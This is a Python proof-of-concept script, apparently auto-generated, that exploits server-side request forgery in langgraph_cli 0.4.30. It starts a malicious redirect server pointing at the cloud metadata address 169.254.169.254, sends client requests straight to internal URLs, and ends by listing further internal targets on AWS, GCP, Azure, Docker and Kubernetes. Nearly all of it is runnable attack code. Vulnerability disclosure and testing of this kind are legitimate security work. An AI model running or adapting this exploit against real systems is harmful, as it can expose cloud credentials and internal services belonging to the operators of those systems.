#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: ssrf-002
# Sink: __init__
# Auto-generated — run with: python3 ssrf_url_pointing_internal_service___init.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept SSRF Exploit for langgraph_cli-0.4.30

Vulnerability: Server-Side Request Forgery (SSRF)
- The HostBackend class accepts a user-controlled base_url via CLI
- No validation of URL scheme, host, or IP address
- httpx follows redirects by default, enabling redirect-based SSRF
- Attacker can target internal services (e.g., cloud metadata endpoints)

This PoC demonstrates the vulnerability by:
1. Setting up a malicious redirect server
2. Making the vulnerable client follow a redirect to an internal IP
3. Attempting to access cloud metadata endpoints (safe, read-only)

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--listen-port PORT]

    Default: Starts a redirect server on port 8888 and tests against
    common cloud metadata endpoints.

Requirements: Python 3.7+, httpx (installed with langgraph_cli)
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import httpx (should be available with langgraph_cli)
try:
    import httpx
except ImportError:
    print("[!] httpx not found. Install with: pip install httpx")
    sys.exit(1)


class RedirectHandler(BaseHTTPRequestHandler):
    """
    HTTP request handler that returns a 302 redirect to a target URL.
    This simulates an attacker-controlled server that redirects to internal services.
    """
    
    redirect_target = "http://169.254.169.254/latest/meta-data/"
    
    def do_GET(self):
        """Handle GET requests by returning a redirect."""
        self.send_response(302)
        self.send_header("Location", self.redirect_target)
        self.end_headers()
        self.wfile.write(b"Redirecting...")
    
    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        print(f"[*] Redirect server: {args[0]} {args[1]} {args[2]}")


def start_redirect_server(host="127.0.0.1", port=8888, redirect_to=None):
    """
    Start a simple HTTP server that redirects all requests to a target URL.
    
    Args:
        host: Host to bind to
        port: Port to listen on
        redirect_to: URL to redirect to (default: cloud metadata endpoint)
    
    Returns:
        The server instance (already started in a daemon thread)
    """
    if redirect_to:
        RedirectHandler.redirect_target = redirect_to
    
    server = HTTPServer((host, port), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Redirect server started on http://{host}:{port}")
    print(f"[+] Redirecting to: {RedirectHandler.redirect_target}")
    return server


def test_ssrf_via_direct_url(target_url, timeout=5):
    """
    Test SSRF by directly providing an internal URL as base_url.
    
    Args:
        target_url: The internal URL to test (e.g., cloud metadata endpoint)
        timeout: Request timeout in seconds
    
    Returns:
        Response object if successful, None otherwise
    """
    print(f"\n[*] Testing direct SSRF with URL: {target_url}")
    
    try:
        # Simulate what langgraph_cli does internally
        transport = httpx.HTTPTransport(retries=1)
        headers = {
            "X-Api-Key": "test-key",
            "Accept": "application/json",
        }
        
        with httpx.Client(
            base_url=target_url.rstrip("/"),
            headers=headers,
            transport=transport,
            timeout=timeout,
        ) as client:
            # Make a request to the base URL (this is what the CLI would do)
            response = client.get("/")
            
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response headers: {dict(response.headers)}")
            print(f"[+] Response body (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200:
                print("[!] SUCCESS: Retrieved internal resource!")
                return response
            else:
                print(f"[-] Got status {response.status_code}, but request was made")
                return response
                
    except httpx.ConnectError as e:
        print(f"[-] Connection error: {e}")
        print("[-] Target may not be reachable or doesn't exist")
    except httpx.TimeoutException:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    return None


def test_ssrf_via_redirect(redirect_port=8888, internal_target=None, timeout=5):
    """
    Test SSRF via redirect by providing a URL to our malicious server,
    which then redirects to an internal service.
    
    Args:
        redirect_port: Port for the redirect server
        internal_target: Internal URL to redirect to
        timeout: Request timeout in seconds
    """
    if internal_target is None:
        internal_target = "http://169.254.169.254/latest/meta-data/"
    
    print(f"\n[*] Testing redirect-based SSRF")
    print(f"[*] Redirect target: {internal_target}")
    
    # Start our malicious redirect server
    server = start_redirect_server(port=redirect_port, redirect_to=internal_target)
    
    # Give the server a moment to start
    time.sleep(0.5)
    
    # Now make a request to our redirect server via the vulnerable client
    redirect_url = f"http://127.0.0.1:{redirect_port}"
    print(f"[*] Making request to redirect server at: {redirect_url}")
    
    try:
        transport = httpx.HTTPTransport(retries=1)
        headers = {
            "X-Api-Key": "test-key",
            "Accept": "application/json",
        }
        
        with httpx.Client(
            base_url=redirect_url,
            headers=headers,
            transport=transport,
            timeout=timeout,
        ) as client:
            # This request will be redirected to the internal target
            response = client.get("/")
            
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response headers: {dict(response.headers)}")
            print(f"[+] Response body (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200:
                print("[!] SUCCESS: Redirect-based SSRF worked!")
                return response
            else:
                print(f"[-] Got status {response.status_code}")
                return response
                
    except httpx.ConnectError as e:
        print(f"[-] Connection error: {e}")
    except httpx.TimeoutException:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        server.shutdown()
    
    return None


def main():
    """Main function to run the SSRF PoC."""
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_cli-0.4.30",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with default cloud metadata endpoint
  python3 poc_ssrf.py
  
  # Test with a custom internal target
  python3 poc_ssrf.py --target http://internal.service:8080/api
  
  # Test redirect-based SSRF with custom port
  python3 poc_ssrf.py --listen-port 9999
        """
    )
    
    parser.add_argument(
        "--target",
        default="http://169.254.169.254/latest/meta-data/",
        help="Internal URL to test (default: AWS metadata endpoint)"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=8888,
        help="Port for redirect server (default: 8888)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds (default: 5)"
    )
    parser.add_argument(
        "--no-redirect-test",
        action="store_true",
        help="Skip the redirect-based SSRF test"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_cli-0.4.30")
    print("=" * 60)
    print(f"\n[*] Target URL: {args.target}")
    print(f"[*] Timeout: {args.timeout}s")
    
    # Test 1: Direct URL SSRF
    print("\n" + "-" * 40)
    print("TEST 1: Direct URL SSRF")
    print("-" * 40)
    
    result1 = test_ssrf_via_direct_url(args.target, args.timeout)
    
    # Test 2: Redirect-based SSRF
    if not args.no_redirect_test:
        print("\n" + "-" * 40)
        print("TEST 2: Redirect-based SSRF")
        print("-" * 40)
        
        result2 = test_ssrf_via_redirect(
            redirect_port=args.listen_port,
            internal_target=args.target,
            timeout=args.timeout
        )
    
    # Summary
    print("\n" + "=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)
    
    if result1 and result1.status_code == 200:
        print("[!] VULNERABLE: Direct SSRF succeeded!")
        print(f"[!] Retrieved data from: {args.target}")
    elif result1:
        print("[!] VULNERABLE: Request was made to internal target")
        print(f"[!] Status: {result1.status_code}")
    else:
        print("[-] Direct SSRF test failed (target may not be reachable)")
    
    if not args.no_redirect_test:
        if result2 and result2.status_code == 200:
            print("[!] VULNERABLE: Redirect-based SSRF succeeded!")
        elif result2:
            print("[!] VULNERABLE: Redirect was followed to internal target")
        else:
            print("[-] Redirect-based SSRF test failed")
    
    print("\n[*] Note: If tests failed, the target may not be reachable")
    print("[*] from this network. Try different internal endpoints:")
    print("  - AWS: http://169.254.169.254/latest/meta-data/")
    print("  - GCP: http://metadata.google.internal/computeMetadata/v1/")
    print("  - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01")
    print("  - Docker: http://127.0.0.1:2375/version")
    print("  - Kubernetes: http://10.0.0.1:443/api/v1/namespaces/default/pods")


if __name__ == "__main__":
    main()
